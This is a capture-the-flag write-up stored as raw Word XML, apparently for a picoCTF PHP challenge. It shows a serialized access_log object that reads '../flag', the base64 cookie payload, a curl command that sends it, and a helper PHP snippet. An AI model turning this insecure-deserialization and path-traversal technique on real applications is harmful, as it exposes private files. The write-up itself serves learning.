          <v:rect id="Ink 54" o:spid="_x0000_s1032" style="position:absolute;margin-left:32.05pt;margin-top:275pt;width:163.05pt;height:18.3pt;z-index:25166131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HIdA6AEPAEQWM9UiuaXxU+PBvi60uGbIgMTSBREgPIDRawCRwFG2ARXCQAAAAUCC2QZGDIKgcf/&#10;/w+Ax///DzMKgcf//w+Ax///DwomCYdye2bOLN4X7jNYX253d8iFY7A4GLCMPAAKABEg8A2czjK8&#10;2AG=&#10;" annotation="t"/>
          </v:rect>
        </w:pict>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:pict w14:anchorId="25DDB9A9">
          <v:rect id="Ink 53" o:spid="_x0000_s1031" style="position:absolute;margin-left:12.25pt;margin-top:60.8pt;width:90.4pt;height:18.8pt;z-index:25166028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GgdA64CPgEQWM9UiuaXxU+PBvi60uGbIgMTSBREgPIDRawCRwFG2ARXCQAAAAUCC2QZGDIKgcf/&#10;/w+Ax///DzMKgcf//w+Ax///DwocBod3h3Yp6NqumYYromDmwAoAESAwbnHCMrzYAb==&#10;" annotation="t"/>
          </v:rect>
        </w:pict>
      </w:r>
      <w:r w:rsidR="001F49D5">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6F3FCFB5" wp14:editId="27674980">
            <wp:extent cx="6332220" cy="426212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31"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="4262120"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B16F26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The vulnerability here lies in the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>access_log</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> class </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46FC87A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0ED11CB" w14:textId="19C6C9D1"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49749D63">
          <v:rect id="Ink 55" o:spid="_x0000_s1030" style="position:absolute;margin-left:-4.55pt;margin-top:-.05pt;width:433.15pt;height:21.4pt;z-index:251662336;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ABHQOkC0YBEFjPVIrml8VPjwb4utLhmyIDE0gURIDyA0WsAkcBRtgEVwkAAAAFAgtkGRgyCoHH&#10;//8PgMf//w8zCoHH//8PgMf//w8KRBOHauhvSWczLceGIgHBS+AirwK3wbiGuI/kfGEcKH4Q8PCb&#10;GIaqwDAXU1CxtjBwktAy8tAx8PBACgARILC1odkyvNgB&#10;" annotation="t"/>
          </v:rect>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00ED2DAF" w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">as we can create an </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00ED2DAF" w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>access_log</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00ED2DAF" w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> object that will read "../flag", pass it to the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00ED2DAF" w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>deserialzer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00ED2DAF" w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> at</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01D089D1"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3843CE1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perm_res_encoded</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> =  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>urlencode</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>(base64_encode(serialize($</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>perm_res</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>)));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C457CC2"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0CFDE64"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then encode it with base64 and pass it into the login cookie to trigger the deserialization error in:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="319379D8"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php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="01B6334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if(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>isset</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>($_COOKIE["login"])){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45DAF70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try{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C438A27"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 xml:space="preserve">$perm =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(base64_decode(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>urldecode</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>($_COOKIE["login"])));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4617FD5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r>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:tab/>
        <w:t>$g = $perm-&gt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>is_guest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="215FDB1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lastRenderedPageBreak/>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:tab/>
        <w:t>$a = $perm-&gt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>is_admin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7564AFF5"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2BF4975" w14:textId="70D8462F"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02C59456">
          <v:rect id="Ink 59" o:spid="_x0000_s1029" style="position:absolute;margin-left:-116.55pt;margin-top:10.5pt;width:5.7pt;height:11.4pt;z-index:251666432;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BQKN8VM7zYAb==&#10;" annotation="t"/>
          </v:rect>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00ED2DAF" w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:tab/>
        <w:t>catch(Error $e){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F71E64B" w14:textId="783AA7CC" w:rsidR="00ED2DAF" w:rsidRPr="00ED2DAF" w:rsidRDefault="00000000"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pict w14:anchorId="6E20B7DE">
          <v:rect id="Ink 58" o:spid="_x0000_s1028" style="position:absolute;margin-left:-221.55pt;margin-top:31.6pt;width:5.7pt;height:11.4pt;z-index:251665408;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4mm">
            <v:stroke opacity="21845f" endcap="square"/>
            <v:path shadowok="f" o:extrusionok="f" fillok="f" insetpenok="f"/>
            <o:lock v:ext="edit" rotation="t" aspectratio="t" verticies="t" text="t" shapetype="t"/>
            <o:ink i="AFwdAhImARBYz1SK5pfFT48G+LrS4ZsiAxNIFESA8gNFyAFHAUaQA1cJAAAABQILZBkYMgqBx///&#10;D4DH//8PMwqBx///D4DH//8PChEBAQABAAoAESAwo50QM7zYAb==&#10;" annotation="t"/>
          </v:rect>
        </w:pict>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:pict w14:anchorId="4F756698">
          <v:rect id="Ink 56" o:spid="_x0000_s1027" style="position:absolute;margin-left:63.25pt;margin-top:-4.25pt;width:190.3pt;height:24.25pt;z-index:251663360;visibility:visible;mso-wrap-style:square;mso-wrap-distance-left:9pt;mso-wrap-distance-top:0;mso-wrap-distance-right:9pt;mso-wrap-distance-bottom:0;mso-position-horizontal:absolute;mso-position-horizontal-relative:text;mso-position-vertical:absolute;mso-position-vertical-relative:text" filled="f" strokecolor="#00f900" strokeweight="6mm">
            <v:stroke opacity="21845f" endcap="square"/>
            <v:path shadowok="f" o:extrusionok="f" fillok="f" insetpenok="f"/>
            <o:lock v:ext="edit" rotation="t" aspectratio="t" verticies="t" text="t" shapetype="t"/>
            <o:ink i="AJYBHQP6BFABEFjPVIrml8VPjwb4utLhmyIDE0gURIDyA0WsAkcBRtgEVwkAAAAFAgtkGRgyCoHH&#10;//8PgMf//w8zCoHH//8PgMf//w8KSheHWDiyuGN0qwZw+Wk+B5tnBbcBhxxty29w2mEORZy1kmky&#10;8Icj0XhMEiVywDDYBBKVO4NAohMYNIonD4KACgARIMDAJ/wyvNgB&#10;" annotation="t"/>
          </v:rect>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00ED2DAF" w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="00ED2DAF" w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:tab/>
        <w:t>die("Deserialization error. ".$perm);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F9CAE73"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b/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38DD5E80"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1F7F1D8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6A9DAE3E"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and pass us the flag. To do this with encode the string "O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}" in base64 and pass it into the login cookie with curl.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E3282AD"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32CBEDE1" w14:textId="48D3FF3F" w:rsid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curl -v --cookie 'login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9' mercury.picoctf.net:</w:t>
      </w:r>
      <w:r w:rsidR="00C6541D">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>5428</w:t>
      </w:r>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>authentication.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="04946A8F" w14:textId="07F3E556" w:rsidR="00D51F95"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47DC2226" w14:textId="42108CEA" w:rsidR="00D51F95"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noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0FFACD25" wp14:editId="58F565CF">
            <wp:extent cx="6332220" cy="22720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6332220" cy="2272030"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="01AB2EA6" w14:textId="77777777" w:rsidR="00D51F95" w:rsidRPr="00ED2DAF" w:rsidRDefault="00D51F95"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036AA1F8" w14:textId="283E82D3"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xml:space="preserve">Endnote: to find the string "O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}" that needed to be encoded I played around in an online </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> compiler </w:t>
      </w:r>
      <w:hyperlink r:id="rId133" w:history="1">
        <w:r w:rsidRPr="00C6541D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
            <w:kern w:val="0"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:lang w:val="en-CA" w:bidi="ar-SA"/>
          </w:rPr>
          <w:t xml:space="preserve">at </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidR="00C6541D" w:rsidRPr="00C6541D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
            <w:kern w:val="0"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:lang w:val="en-CA" w:bidi="ar-SA"/>
          </w:rPr>
          <w:t>php</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidR="00C6541D" w:rsidRPr="00C6541D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
            <w:kern w:val="0"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:lang w:val="en-CA" w:bidi="ar-SA"/>
          </w:rPr>
          <w:t xml:space="preserve"> sandbox</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00C6541D">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">with serialize and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>unserialize</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> functions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25291AC4"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&lt;?</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C6541D">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="34F4888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class </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C6541D">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>access_log</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2425724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lastRenderedPageBreak/>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B9E47EA"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public $</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4C218A9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__construct($</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 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DCDE65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xml:space="preserve"> = $</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C6541D">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>lf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C6541D">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F09A51E"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8C4CD8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function __</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C6541D">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>toString</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C6541D">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>() {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="510E29E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return $this-&gt;</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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27699B8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5E33D72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append_to_log</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C6541D">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>($data) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05D2A075"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r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C6541D">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
